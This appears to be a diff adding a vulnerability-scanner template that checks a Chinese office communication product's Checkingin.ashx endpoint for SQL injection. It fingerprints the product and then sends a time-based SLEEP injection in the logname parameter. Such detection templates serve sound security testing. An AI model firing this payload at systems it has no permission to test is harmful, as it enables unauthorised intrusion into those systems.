@@ -1,0 +1,47 @@
+id: poc-yaml-aofax-checkingin-ashx-sqli
+
+info:
+  name: 傲发办公通信专家系统 Checkingin.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 傲发办公通信专家系统 Checkingin.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "getincommingcall"
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/handle/Checkingin.ashx?type=checkingin&logname=%27+and+(SELECT+*+FROM+(SELECT(SLEEP({{t1}})))x)+and+%27&date=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0-0-0"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
